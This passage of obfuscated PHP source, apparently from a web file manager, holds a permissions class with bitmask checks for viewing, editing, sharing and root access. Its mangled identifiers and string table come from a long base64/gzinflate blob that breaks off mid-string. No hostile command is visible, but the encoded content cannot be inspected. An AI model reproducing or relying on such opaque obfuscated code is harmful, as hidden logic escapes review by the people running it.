authCheckEdit($Ï…»“º) { return self::authCheck($Ï…»“º, self::AUTH_EDIT); } public static function authCheckRemove($ª¢öÑÜ²) { return self::authCheck($ª¢öÑÜ², self::AUTH_REMOVE); } public static function authCheckShare($õÒ¶ƒê¼) { return self::authCheck($õÒ¶ƒê¼, self::AUTH_SHARE); } public static function authCheckComment($’èÊÍ) { return self::authCheck($’èÊÍ, self::AUTH_COMMENT); } public static function authCheckEvent($Çå’Î×) { return self::authCheck($Çå’Î×, self::AUTH_EVENT); } public static function authCheckRoot($…÷ùöï) { return self::authCheck($…÷ùöï, self::AUTH_ROOT); } public static function authCheckAction($ìËºÌïâ, $á»Äœ) { $²ãÑ‚€Ğ =& $_SERVER[Ó¡Ÿ§‚]; $æÖß¸ìš = array($²ãÑ‚€Ğ[1874] => self::AUTH_VIEW, $²ãÑ‚€Ğ[1193] => self::AUTH_DOWNLOAD, $²ãÑ‚€Ğ[107] => self::AUTH_UPLOAD, $²ãÑ‚€Ğ[1824] => self::AUTH_EDIT, $²ãÑ‚€Ğ[1823] => self::AUTH_REMOVE, $²ãÑ‚€Ğ[1834] => self::AUTH_SHARE, $²ãÑ‚€Ğ[354] => self::AUTH_COMMENT, $²ãÑ‚€Ğ[1653] => self::AUTH_EVENT, $²ãÑ‚€Ğ[1875] => self::AUTH_ROOT); if (!isset($æÖß¸ìš[$á»Äœ])) { return; } $¹İ†¤£ = $æÖß¸ìš[$á»Äœ]; $ìËºÌïâ = intval($ìËºÌïâ); if ($ìËºÌïâ <= 0) { return !1; } if (($ìËºÌïâ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ìËºÌïâ & $¹İ†¤£); } public static function authDisable($­”ÓÇè—, $‹Øæş•Ú) { if (intval($­”ÓÇè—) <= 0) { return 0; } return intval($­”ÓÇè—) & ~$‹Øæş•Ú; } public $optionType = "\x53\x79\163\x74\x65\155\56\x73\x6f\165\x72\x63\x65\101\165\164\x68\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\141\165\x74\x68", "\x6c\141\x62\145\154", "\144\151\x73\160\154\x61\x79", "\163\171\x73\164\145\x6d", "\163\157\x72\164"); public function initData() { $ƒÆë¡Â¦ = $this->authDefault(); foreach ($ƒÆë¡Â¦ as $İ·˜Àµ) { $this->add($İ·˜Àµ); } } public function findAuth($©ÒŠ¬ıâ, $ûŞŠ‰Ş ) { $ÈƒØ‡¥Ì =& $_SERVER[Ó¡Ÿ§‚]; $¡æØøï¼ = parent::listData(); foreach ($¡æØøï¼ as $‰Ãäù¢) { $Üæƒ‹Óœ = intval($‰Ãäù¢[$ÈƒØ‡¥Ì[422]]); if ($Üæƒ‹Óœ <= 0 || $‰Ãäù¢[$ÈƒØ‡¥Ì[1876]] == 0) { continue; } if (($Üæƒ‹Óœ & $©ÒŠ¬ıâ) != $©ÒŠ¬ıâ) { continue; } if (($Üæƒ‹Óœ & $ûŞŠ‰Ş ) != 0) { continue; } return $‰Ãäù¢[$ÈƒØ‡¥Ì[399]]; } return !1; } public function findAuthReadOnly() { $¾®ŒóŠ¾ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ã²®Ò¾‚ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¾®ŒóŠ¾, $ã²®Ò¾‚); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $É”éÌ®… =& $_SERVER[Ó¡Ÿ§‚]; $–ëºîö = parent::listData(); $ôè†°®† = !1; foreach ($–ëºîö as $Í×Äù) { if ($Í×Äù[$É”éÌ®…[422]] <= 0 || $Í×Äù[$É”éÌ®…[1876]] == $É”éÌ®…[198]) { continue; } if (!$ôè†°®†) { $ôè†°®† = $Í×Äù; continue; } if ($ôè†°®†[$É”éÌ®…[422]] > $Í×Äù[$É”éÌ®…[422]]) { $ôè†°®† = $Í×Äù; } } return $ôè†°®† ? $ôè†°®†[$É”éÌ®…[399]] : $É”éÌ®…[12]; } public function listData($Åæ¾Û­¶ = false, $Æ¸û¡äÑ = "\163\x6f\162\164", $ºÌÅú¯Ã = false) { return parent::listData($Åæ¾Û­¶, $Æ¸û¡äÑ, $ºÌÅú¯Ã); } public function update($Üı“êøğ, $‘»ëÓÖ) { $œ˜‘˜“ú =& $_SERVER[Ó¡Ÿ§‚]; $ëù¨®½å = parent::listData($Üı“êøğ); $¦ğÓ×ÖË = $this->findByName($‘»ëÓÖ[$œ˜‘˜“ú[32]]); if (!$ëù¨®½å || $¦ğÓ×ÖË && $¦ğÓ×ÖË[$œ˜‘˜“ú[399]] != $ëù¨®½å[$œ˜‘˜“ú[399]]) { return !1; } $this->filterAuth($‘»ëÓÖ[$œ˜‘˜“ú[422]]); return parent::update($Üı“êøğ, $‘»ëÓÖ); } public function remove($á À¿øÁ) { $úÔŞåô = parent::listData($á À¿øÁ); if (!$úÔŞåô || $úÔŞåô[$_SERVER[Ó¡Ÿ§‚][1283]]) { return !1; } return parent::remove($á À¿øÁ); } public function add($—«à§† = array()) { $©åË¼€ö =& $_SERVER[Ó¡Ÿ§‚]; if ($this->findByName($—«à§†[$©åË¼€ö[32]])) { return !1; } $ÄÜ¸Öç = array($©åË¼€ö[32] => $©åË¼€ö[12], $©åË¼€ö[422] => 1, $©åË¼€ö[1877] => $©åË¼€ö[1864], $©åË¼€ö[1876] => 1, $©åË¼€ö[1283] => 0, $©åË¼€ö[1878] => 0); $—«à§† = array_merge($ÄÜ¸Öç, $—«à§†); $—«à§†[$©åË¼€ö[1878]] = $this->getSort(); $this->filterAuth($—«à§†[$©åË¼€ö[422]]); return parent::insert($—«à§†); } private function getSort() { $¹§êúì =& $_SERVER[Ó¡Ÿ§‚]; $è×•ÃúÖ = parent::listData(); $ªò©ÙÀ = array_to_keyvalue($è×•ÃúÖ, $¹§êúì[12], $¹§êúì[1878]); return empty($ªò©ÙÀ) ? 0 : max($ªò©ÙÀ) + 1; } private function filterAuth(&$èğÕÄ§×) { if (!$èğÕÄ§×) { return; } $¹ç‡½ò˜ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Âô“âê¢ = array(); foreach ($¹ç‡½ò˜ as $Ë‡ìˆ¡…) { if ($èğÕÄ§× & $Ë‡ìˆ¡…) { $Âô“âê¢[] = $Ë‡ìˆ¡…; } } if (in_array(self::AUTH_ROOT, $Âô“âê¢)) { $èğÕÄ§× = array_sum($¹ç‡½ò˜); return; } $¿ãîæÁ– = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Âô“âê¢ as $Ë‡ìˆ¡…) { if (isset($¿ãîæÁ–[$Ë‡ìˆ¡…])) { $Âô“âê¢ = array_merge($Âô“âê¢, $¿ãîæÁ–[$Ë‡ìˆ¡…]); } } $Âô“âê¢[] = self::AUTH_SHOW; $èğÕÄ§× = array_sum(array_unique($Âô“âê¢)); } public function sort($¾¿¯§ô, $Ğçå£š£) { return parent::update($¾¿¯§ô, $Ğçå£š£); } } goto b“…óî®ŒÜ; CÑô¥ñÄ³ò: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\323\241\237\247\217\202", "\261\273\262\326\252\223"); $_SERVER[Ó¡Ÿ§‚] = explode("\174\3\174\3\174\3", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9B3gc1bUwJaGYmlBDHQRGkr1F7rZs2ayklbV4pZV3V26SPJ7d').strrev('ÿ¼Ù™nrİá¨J<=1¶'."\0".'”Í0=ïLĞ„´!C&½`’˜€\\Õfg¬îí#I')."\373\377\357\373\215\361\336\76\267\234\173\356\71\347\236\163\356\373\67\176\264\355\266\67\126\356\214\377\273\375\226\127\376\364\352\75\64\274\162\107\364\337\317\151\370\310\265\273"."\355\100\376\354\267\366\364\252\252\346\251\143\306\267\356\171\346\55\327\153\77\253\177\361\253\207\156\171\352\322\27\376\371\324\237\222\231\331\167\136\332\163\304\16\351\311\207\35"."\134\213\212\322\232\265\364\107\311\233\216\242\17\31\266\143\323\204\264\231\357\66\172\150\330\310\323\337\40\375\151\217\107\55\75\147\72\72\215\6\350\217\12\275\42\377\331\313"."\xb3\x6\xcb\x57\x5b\x63\x49\x35\xd1\xde\xd6\x16\x8e\x27\xa1\x50\xad\x9c\x9f\x33\x33\x10\x2a\x68\x96\x96\x83\xef\x17\x74\xcb\x46\xbd\x91\x9b\x53\xb\x66\x41\xcf\xbb\x52\x44\x42\x46\x73\xb4\x94"."\146\103\113\215\365\152\143\270\55\32\133\254\46\27\267\205\241\104\112\135\136\324\255\141\32\43\301\204\243\131\116\322\310\351\274\304\240\305\373\125\37\236\33\151\125\222\361\120"."\x6b\x22\xd4\x90\x8c\xc4\x5a\x69\x72\x43\xac\xa5\x25\x92\x2c\x4d\x8f\xc7\xa2\xd1\xfa\x50\xc3\xbc\xd2\x9c\xb6\x78\x68\x6e\x4b\x48\x41\xfd\xcb\xea\xaa\x91\xef\x36\xab\x94\x65\x34\x67\x99\x52\x4d"."\x3\x4d\x86\x9e\xcd\xd0\x60\x5e\x63\xdd\x71\x86\xb\x10\x4a\xf2\x10\x5a\xa6\x7c\x31\x9b\xa5\x91\x56\x1e\xca\xe8\xdd\x5a\x31\xb\xb3\xd5\x28\x47\xa\x96\x91\xd3\xd8\xa0\xe7\xe9\xc3\x3c\x95\x6"."\xb4\xa2\x63\x1a\xf9\x34\x8d\x84\x87\x1c\x4b\x13\xe9\xa8\xaf\x69\xb4\xd0\x7a\x1e\x9a\x4a\x84\xa3\xe1\x86\xa4\x82\x3b\xa8\x34\xc5\x63\x2d\xa\x2c\x42\x4e\xb3\x1d\xdd\x52\x16\x36\x87\xe3\x61\x5"."\167\272\256\222\214\265\122\1\170\151\105\123\241\204\242\121\145\264\26\34\75\127\140\315\320\72\145\32\213\305\33\303\161\245\176\261\42\146\50\155\346\162\146\76\200\132\101\53"."\xe9\x48\x5d\xd\xc7\xe3\x34\xe0\x3\xf0\x8e\x46\xf0\xa2\x41\x24\xd6\xd4\x94\x8\xf3\x18\xc\x6e\x7e\x14\xf5\x64\x12\xc0\xa7\x2b\x96\xe9\xce\x3a\xea\x80\x96\x2d\x32\x30\xed\xa7\xbf\x95\xf0\x3"."\277\246\15\240\273\334\310\33\105\0\123\150\302\64\371\266\202\100\221\225\326\131\212\236\201\100\16\325\67\141\347\241\155\70\100\203\165\263\351\357\114\50\224\122\161\236\156\71"."\xaa\x9e\x4f\x9b\x19\x23\xf\x9b\x75\xe\x0\x9d\xe6\xf4\x36\x5a\x6\x2a\x40\xe3\xdd\x66\x36\xc3\xc2\xb6\x31\x2\x43\xe9\x36\xb2\x7a\x6b\x31\x27\x17\xe1\xd1\x74\xaf\x91\xcd\x58\x6c\x7f\xfd\x58"."\x49\x1a\x8d\xf2\xed\x8a\xcb\x8a\x58\x1\xf5\x4\xfa\x8c\xba\xd9\x3d\x2c\xf6\x1b\x2e\xd7\xc6\x73\x6d\xb3\x68\xa5\xf5\x8\xda\x1f\x34\x3e\x1\x92\x75\xc7\x41\x83\x83\xb9\x31\xcc\xf6\x42\xd6\xd4".base64_decode('Mgnd4kMzzCbUUKzoyIlFUqzJtHKNCDPA99GuMNrLZPSzfZGRZixY1XGS/z9dHceh')."\x7f\xaa\x1\xf5\x75\x42\x9f\x7a\xf5\x6c\x56\xd5\x87\x74\xd8\x38\xb9\xcc\x14\x9b\x4d\x46\xd0\x4e\x19\xf9\x20\x4a\xa1\xd1\x48\x4c\xed\xd5\xec\xde\x96\xcc\x14\x95\xd4\x82\x2e\xe7\x33\xfa\x50\xa0"."\320\133\240\121\261\245\73\135\200\215\247\256\325\164\302\22\136\316\232\151\55\53\17\221\206\173\35\247\220\320\363\31\74\23\60\24\163\60\117\146\252\240\353\120\250\321\247\144".base64_decode('lBZlsdJca9TarGIuy0NsdDzN5onOEFvOTDcNpNixUAEfNGyC4cT21AqFrJHWHMPM')."\7\315\264\243\73\176\333\261\164\15\132\14\245\323\272\155\373\33\314\274\143\231\131\177\50\233\65\7\375\61\313\350\61\362\265\312\70\132\6\147\242\115\355\307\10\260\26\166".base64_decode('asVMBQMO/sy4uqLT7Z/OdiAvbWl5u1u3/GHYGbUK6izHgqxYo2EXTNvA3atVNMfR')."\322\275\30\203\210\346\353\176\244\274\221\317\32\171\275\244\154\170\250\140\130\272\315\372\252\314\155\111\102\43\250\165\335\337\146\151\75\71\255\126\51\24\123\150\146\140\247\226".base64_decode('SaOlYWpqlTSO+pRc0Xb8lo5QkYGOO5jkSLe/Be8rQ8/4EwhjQ/KkmskKAh2F5dHU').strrev('×¡n æm‰cEjàahü‹‰d›Ì<"}aëGmĞÍ'."\r".'’„¶¬5¹#¡4M²dæ')."\327\52\375\146\46\145\16\5\130\26\56\234\100\210\206\25\306\313\135\160\374\161\55\337\203\347\47\65\354\350\0\202\366\100\217\173\242\243\172\276\307\351\145\25\23\341\370\202"."\160\134\115\304\232\222\13\103\161\70\314\363\10\112\206\330\247\160\323\131\177\134\317\240\251\117\73\254\236\126\300\263\306\312\340\315\201\327\212\345\342\15\303\362\242\221\271\170".strrev('®¸ÀÆÎê¸ïô~Õñ™Uqí:ê€É…ÏÒtI™xw}ÀÎF£¶±K—ä*6ıb')."\71\101\103\324\11\116\10\114\120\46\326\114\125\332\20\351\141\150\131\5\6\135\122\242\106\211\315\163\117\213\200\346\274\231\327\177\144\162\360\331\45\155\173\317\264\322\304\170"."\170\176\173\70\221\124\133\302\311\346\130\43\174\75\34\202\120\324\244\333\226\215\266\203\376\164\301\352\166\321\37\325\260\233\244\143\5\107\71\372\121\315\124\37\132\214\26\235"."\341\330\156\212\243\43\71\255\107\102\362\70\25\307\132\114\113\167\247\0\154\40\10\132\150\144\370\31\201\242\315\272\321\323\13\363\145\340\326\322\146\326\264\264\54\306\214\154"."\123\350\14\133\365\30\200\255\0\11\213\110\302\310\25\130\147\235\336\142\56\45\5\1\333\73\374\244\262\21\44\261\160\257\311\117\66\323\202\120\155\20\252\214\235\330\4\333".strrev('äTºÎq,&½µ4W-S‰XíqÄ×Y§+œi4vÅôì‚L¡9˜Ï’BLL2').base64_decode('fWO9zOhZnc1Lr84OjBoohg48PmvdfPUQ3YdSxUlt2HFUE6N3Fl+ICWWRkEUnVIys')."\xb8\x88\xb7\x59\x7a\xb7\x1\x9b\x34\x8f\x56\xa4\x45\xb3\xfa\xd9\x18\xd0\xa\x8\x58\xc1\x11\x9\x8e\x9a\xda\xa3\x51\xb5\x21\xd6\x9a\x44\x24\x35\x4d\x59\x18\x8f\x24\xc3\xc\x6e\x43\x8d\x6a\xa8".strrev('0ç‡\'HK@)Äed—zA'."\r".'COî¶ó0]Œ!ÌqA;¨²°‰çÈ/€Ü`ŒBŠòrÆ¡')."\x18\xf2\x6b\xb9\x11\x7f\xe\x6d\x1\x3f\xef\xa8\xfb\xc\x56\xe0\x74\xa0\x47\x79\x4\xd6\x46\x20\x77\x3c\x8d\x88\x2b\x62\x87\x7f\x5b\x2c\x1\x15\xe6\xe0\x54\x44\x80\xa5\x74\xb\x3e\xd6\xd6\xe"."\131\71\11\56\346\206\41\161\14\200\122\257\6\144\125\150\141\202\41\346\42\52\157\31\43\232\30\322\34\326\37\66\220\134\126\320\163\356\121\371\305\314\47\233\43\255\363\324".base64_decode('llhjOKpGWhFmSpamt7c1hthSyun1sWSzK7Ud4aYFoWjEWzy8KJJIJspmobT2sCcH')."\61\202\155\361\160\123\144\21\217\66\105\302\321\306\204\332\20\152\150\26\145\132\103\55\20\121\273\61\53\146\7\335\345\125\204\144\23\234\241\123\7\60\163\312\46\113\165\361".strrev('6€SŠ„­Sú*ÊÆ‘6'."\r".'9ÃÉ	ÀÙm8†#&%˜¸`ÒÕ0èCTã*P')."\x10\xe\x48\xd\xf3\x20\x19\x6\x8b\x23\x92\x11\xbe\xaf\x0\xc2\x2f\xe9\x81\x8a\xcb\xd4\xeb\xdd\x1c\xf\x97\x4f\x8\x75\x3b\x1c\xdd\x7b\xe2\x8\xf8\x45\x1e\x5a\x81\x10\xe1\xbd\x11\x24\x90\x15".strrev('ƒHÊ!'."\r".';<ÀWŠ¿¦@ë:½ƒ'."\n".'…Îµ]Y®a-¬j½ğ[§uˆNY+hÏ')."\275\222\23\223\336\147\262\251\134\111\177\216\245\77\210\50\204\217\353\171\66\353\51\214\221\331\351\302\2\335\150\67\60\154\152\26\371\327\122\246\11\137\310\142\372\200\6\21"."\xc2\xe0\xcc\x77\x9f\xcd\x80\x64\x88\xa1\x9a\xf1\xf0\xc1\x21\x38\x15\x92\xb1\x79\xe1\x56\x95\x41\x16\x8d\x49\xd0\x48\x13\x10\x3b\x1b\x8b\xc3\x84\x38\x66\x3f\xe3\xc9\x68\x66\x3c\x9c\x60\xbb\xdc"."\322\227\27\15\66\135\301\300\170\200\142\35\35\74\360\371\340\322\316\301\361\125\35\376\361\201\56\24\250\36\167\34\215\102\254\63\340\212\36\3\365\213\26\257\215\311\246\52".strrev('¶3œë©útsœ'."\0".'\\*òo¢bµĞñêñ®şş5#üÑä#¶§5X3°gmuN{').base64_decode('03/s6mXHdXR2VdaOP6ozcHTnYNe46jnsO+mihfjN9DDvamZ8FeoSIqd4kTxBeVIB')."\x96\x31\x62\x14\x44\xea\x8a\xa9\xab\x58\x3a\x5a\x43\xbd\x47\xd4\xe8\xf0\x77\x8e\xef\x9a\x23\xd5\x93\x92\xbc\xdf\x42\xe4\x12\xc2\xbf\xbd\xbc\x5c\xc8\xbf\x4\x8f\x8c\x57\xc5\xfb\x1e\xe0\xa3\x98".strrev('9}yÄÎXŞbÎ€,â›d-Š»úXÅ~*néóœ“¡|òz0KJE÷‰ìO')."\4\114\207\301\167\112\167\6\165\6\36\50\335\25\107\300\301\130\107\224\45\305\262\204\60\204\57\140\206\212\303\50\7\46\243\240\142\12\153\220\307\62\172\36\326\151\167\50"."\155\247\265\202\236\220\106\250\252\311\120\175\64\254\62\14\3\230\230\305\11\126\254\347\42\73\64\64\201\121\31\176\110\13\22\236\160\53\260\363\355\345\131\205\40\6\105\267"."\x2c\xd3\xaa\x25\xd2\x4b\xbb\x58\xc0\x4\x19\xe2\xcc\x1c\x34\xb7\xa\xe2\xe9\x95\xba\xd9\xa\x9d\x72\xa8\xa7\xca\xb\x50\xd0\x18\x9d\x80\xb9\x6d\x5d\x6c\x7a\x8c\xa1\xa0\x4f\x5\xb1\x42\x36\x22"."\243\30\165\23\254\352\354\54\166\350\231\256\16\4\370\232\277\273\153\305\244\125\325\214\312\17\166\242\77\54\22\52\43\107\123\71\66\124\321\371\34\300\375\340\242\24\127\204"."\147\323\250\151\161\22\251\340\42\242\35\323\321\262\256\46\222\70\5\26\227\37\334\40\124\240\253\35\25\30\13\37\345\222\0\222\240\323\126\316\304\163\331\210\44\1\303\65"."\x12\xba\x13\xe0\x25\x7c\x52\xa6\x8a\xe2\x2e\x61\x70\x1d\x8\x8\xba\x8d\x3c\xda\x4e\xd\xd2\x51\x47\x45\x3b\x89\x61\xdb\xd1\x73\x2e\xa9\xa5\xad\x6b\x56\xba\xb7\xa9\x98\xcd\x3a\x9c\x94\xcf\x1a"."\375\360\5\330\53\40\104\365\323\37\145\174\271\252\115\246\305\70\342\161\320\215\212\161\345\12\106\362\171\304\277\312\240\46\16\331\271\41\104\316\44\225\52\46\360\123\42\255"."\112\175\54\26\15\207\132\25\174\236\303\71\204\210\205\104\270\55\204\16\61\314\133\47\222\141\220\101\106\32\375\254\335\105\376\10\160\130\74\140\300\264\233\5\214\101\124\64"."\47\52\342\144\30\21\241\165\3\33\35\311\173\123\330\244\146\165\25\235\367\52\320\247\66\115\256\17\45\42\15\152\133\210\121\125\132\241\20\264\63\375\166\20\217\331\30\320"."\xa3\x46\x2a\x88\xe5\x54\x58\x6c\x1e\xe0\x92\x9c\xc9\x0\x28\xbd\x7a\xba\x5f\xd5\x52\x68\x37\x31\x1e\xb2\x88\xc5\x1d\xae\x4e\x31\x60\x43\x18\xdb\x61\x63\x1\x11\x1e\xc4\x30\x25\xec\xc3\x22\x2c"."\37\46\205\174\150\222\175\230\177\363\11\346\302\47\44\202\276\1\103\37\44\1\316\15\370\200\111\360\71\232\205\106\210\251\170\10\106\32\175\206\335\110\370\32\362\1\222\305".base64_decode('OuT0YkFNVhv20c5F9QE962Nd87Ee+xjz6iMcZyN0qx3tfugWCSIk3+vD8I63m0/I').strrev('Ë­¶!¡“æO°Ìcã¦›ˆO3è‚AnÑŠS}¡bÌ±ëä»ùÁGXH·^`æ}(')."\116\147\371\321\220\371\367\166\2\326\16\147\225\316\322\117\54\126\351\172\270\145\2\53\150\213\40\164\130\305\16\145\127\31\261\274\2\244\105\14\57\200\10\55\20\170\6\17".strrev('ôõÇ'."\r".'(µÊ-q…¾ÃÖsé	=jMÆ²+×Æ^êZ`…\'ˆLûfØ2¯!I¨').base64_decode('cFpw0o0Sf+6OuTdXEbWX0Lo9g/SRXVZuh5SHAA71fMHG7L47m3G2Ffjqu3bQT+9d')."\x18\x25\xc1\xe7\xb1\x82\xa0\x88\x68\x67\xf1\x99\x92\x40\x38\xa5\x29\xcb\xa6\x68\xa2\x9c\xd\xa7\x89\xcf\x1d\xc3\x5b\x2f\x40\x4e\x17\x72\xef\x93\xe0\x22\x97\x68\xb8\x29\xa9\x1c\x1f\x43\xa8\xd8"."\x30\x55\x5a\x47\xc5\x85\x15\xf2\x8f\x99\x57\x5c\x6d\xb3\xe9\x52\xea\x48\xbe\x88\x6b\xf9\xc\x4d\x59\x86\x8e\xad\x65\x75\x15\xec\x23\x15\xae\xea\x2\x68\xdc\x9d\xf0\xb1\xa8\xeb\x6b\x62\xfd\xe5"."\111\300\300\101\206\57\216\132\226\24\23\47\173\21\310\130\315\116\323\0\226\343\103\110\147\151\142\151\145\50\225\220\221\110\140\375\162\175\27\107\305\16\143\40\241\340\17\100"."\x3\x84\xf0\xc2\x8\xc7\x2f\xf6\x8a\x14\x75\x4f\xb9\x7\x22\x3d\xf4\x0\x9e\xa2\x36\x23\x3f\x6c\xe4\x65\x91\x9b\x48\x85\x1e\x3\x8a\x15\x5b\xdd\x23\x24\x6c\x1c\x2d\x4c\x8f\x18\x21\xd2\xf3\x81"."\250\317\207\117\54\211\332\20\362\46\324\173\162\154\346\134\302\311\322\236\63\244\353\167\155\150\0\362\136\315\22\363\307\320\20\306\5\102\166\211\213\210\250\124\254\133\33\20"."\4\226\253\216\204\114\154\147\230\165\130\16\272\33\245\321\106\37\371\155\106\3\227\167\50\137\21\214\72\130\41\212\203\320\366\217\242\351\101\77\144\40\111\323\207\205\235\350"."\x87\x92\x21\x36\xeb\x72\x94\x9f\xfa\x3e\xc4\x7a\x35\xc2\x9d\x12\xe\x2f\x40\x7b\x1e\x60\x5\xcf\x71\x15\xc3\x19\x40\xc\xa9\x92\x48\x83\xe3\x1c\x37\x42\xa3\x3d\x9\x71\xfc\x8e\x4e\x4d\x74\xe6"."\321\60\342\75\262\350\250\263\2\170\213\314\305\7\26\233\37\212\335\144\220\113\350\150\314\120\117\264\226\50\311\223\113\13\161\26\306\375\342\254\140\363\52\166\230\230\153\261"."\x9d\x7a\x44\x87\xf0\xd4\xaa\xa5\xfd\xc0\x0\x5c\x3e\xde\x64\x99\x9c\x50\xe7\xc7\xbe\xb7\x50\x3\xe1\x84\xf9\x5\xaa\xe7\xa8\x96\xe6\xc3\x45\x5e\x94\x24\x49\x75\xbc\x84\x86\x27\xd5\x13\x15\xb"."\341\72\147\150\22\223\165\153\231\234\221\17\130\364\64\13\40\376\6\56\275\175\65\22\55\46\320\314\12\233\234\13\160\372\255\362\254\263\143\232\210\151\266\2\26\372\262\350"."\x90\x84\xe2\x0\x3f\x90\x3b\x51\x7c\xc\xca\x14\x4\x6f\xc5\x46\x19\x12\xb2\x76\x13\x4a\xac\x66\xa2\xa0\x31\x1c\xd\x2c\x51\x91\x7f\x86\x53\x75\x34\x9a\x37\xd2\xfd\x62\xa7\x6a\x3\x88\x5a\x66"."\x18\x95\xc\x46\xba\xbd\x26\xf1\x28\xa7\xdc\x31\xee\x8\x67\xc\x7\xa7\xe0\xcd\x68\x32\xc1\xbc\x28\x28\x4e\x4c\x91\x26\xa3\x6c\x72\xf2\x94\x2c\xbe\x60\x83\x7c\x63\x5d\x25\xdd\xb4\x3\x24\x8e"."\x23\x47\x7a\x40\x90\x3a\xe5\xf5\x0\xd2\x66\x1\x20\x42\x52\x80\xc9\x99\x3\xba\x94\x18\xb0\x1d\xb3\x20\x72\xa4\x28\xcd\x96\xb2\x44\xa3\x52\x29\xbe\x48\xa4\x47\x68\x7f\x65\x8\xc1\x2c\xa6\x8c".base64_decode('lIW6RDhAt3AAs0MBMauRxpBlMQCmw8S3TChRTsK4MMF2X7njijYeHhDqLbQp/OEA')."\xdd\xfe\x1\x2d\x93\x89\xb1\x9b\x36\x39\x5c\x5a\x54\x16\x94\x96\x6f\x88\xe8\x1a\xf1\xa6\xa4\x58\xf9\xe2\xa1\x6c\x56\xe8\x27\x78\xe3\xa3\x56\xa1\xdb\x5e\xae\x24\xa7\x8c\x5a\xad\x89\x70\xe6\x8c"."\xd7\x2b\x97\xc6\x99\x1c\x79\xdb\xb9\x9\x75\x2f\x19\xef\x46\xd5\xa3\x93\x2c\x6c\x73\x7a\xf9\x11\xbe\x8c\xe5\xe3\xe8\x94\x6f\xe8\x35\xf2\xba\xcd\xf\x6b\xcb\x2e\x87\xb3\xfe\x3f\xd3\xc6\xa5\x33"."\217\167\310\150\340\202\363\44\221\72\126\263\33\320\145\16\202\313\215\5\312\342\107\70\64\47\10\23\40\16\244\210\352\270\110\252\70\151\137\332\116\56\10\101\333\227\316\7"."\76\262\42\61\264\75\313\303\254\267\234\316\244\352\4\7\16\361\223\126\256\204\263\360\132\216\326\50\317\347\215\11\362\115\56\207\140\25\147\214\326\14\313\346\255\274\175\365"."\x39\xaf\x6e\x78\x91\x86\x9f\x3a\xeb\xea\xbf\xfd\xfd\x31\x1a\x9e\x31\x75\x1a\xd\xa0\xff\x76\x5a\xb9\xb\xd\x9\xad\xca\x53\x16\xae\x30\xdf\x79\xe4\x17\xbb\x2e\xb9\xfc\xb2\x77\xce\xde\x38\xe9".strrev('é}>_YÈ¯ß÷øïcÕØı_ıÍÕø÷ÔnõY5ÅòI¸¾sÚís_Vóëgi°')."\111\113\237\273\262\356\226\343\366\270\345\216\75\236\125\102\373\175\276\371\205\63\127\256\365\335\261\317\331\377\75\143\302\317\76\171\346\303\17\255\356\57\247\235\371\364\234\257"."\337\72\347\310\131\137\77\267\203\266\327\345\107\34\166\112\215\62\274\327\305\57\237\226\15\137\162\362\2\343\356\335\236\270\257\346\340\135\207\226\6\235\127\136\153\170\353\276".base64_decode('Z57a+stv34zsnk3Pykx6e/OaHT//1Vlfdx5xYaPvxP9aph5WufeM7X9buX3ZTvv9')."\362\64\153\336\215\157\324\135\63\176\325\27\227\277\224\131\27\336\74\345\237\307\174\262\370\215\212\236\131\201\55\117\50\203\113\37\77\374\207\225\363\127\235\20\272\351\225\233".base64_decode('Xrrh5t/+oyd99cXRiz9aNfXNvr9NG++f8vSYnbe/+/fs9GfSZ7788l4TF9zx6gud')."\213\137\332\143\211\366\160\364\361\243\243\253\66\234\174\347\336\153\116\274\171\375\343\103\77\173\352\355\45\41\165\323\77\226\76\375\327\53\364\135\257\322\216\66\362\65\316\261"."\73\354\324\60\336\367\351\223\327\26\367\275\260\376\262\73\352\366\51\356\361\311\277\66\354\172\353\206\3\56\330\343\324\274\317\157\37\372\307\35\117\152\235\371\342\5\227\35"."\x64\x7f\x79\xd2\xce\xcf\x3b\x7b\xed\x52\x7b\xdb\xce\xf5\x1b\xfa\x42\xab\x16\x3d\xbc\xcb\x41\xcf\xed\xfc\xe6\x87\x5f\x7d\x3e\xdb\x79\xe0\x80\x5d\x42\x35\x8f\xdc\xf3\xdc\x1e\xbf\x38\x68\xf9\xe5".strrev('îG½CØrÑß£ÊpXk©i.CÒÿu7ßöïçß|Gõıs>ÿÛã"åş‡').base64_decode('fc05Lx9We1/T99c++sUOp6Y3rtpjzAe77D9j6T7psw+Ortxt8xH7f3zTift8O7TP')."\202\175\37\170\147\166\327\274\334\207\153\102\117\35\270\140\277\376\315\123\367\274\171\323\51\357\354\74\362\360\136\353\366\134\276\370\322\366\117\357\372\331\33\325\233\367\72\156"."\xd9\xce\xdf\xee\xfd\xcf\x27\xe\x1d\xfa\xb0\x62\xcf\x75\xe9\xcd\xd7\x55\x1c\x7a\xe7\xb4\x57\xfc\x9b\x6f\xfe\xf9\x4b\xbb\xae\x39\x44\xbd\xe3\xf1\x2b\xfe\x32\xed\xa2\x6b\x5f\xff\xf0\xe2\x15\x6d".base64_decode('l71flVt9cVd4391eWDwUnb9bx60zn7K+XHfeue9e+cW5a4+J/enoGYefcdGiOz8e')."\xca\x7c\xf3\x87\xf4\xad\x57\x6e\x79\x68\x2f\x6d\x87\x2b\xee\xf9\xf3\x2b\x3b\x3e\xdb\xb6\xcb\x8d\xcf\x15\x8f\xbd\xed\x9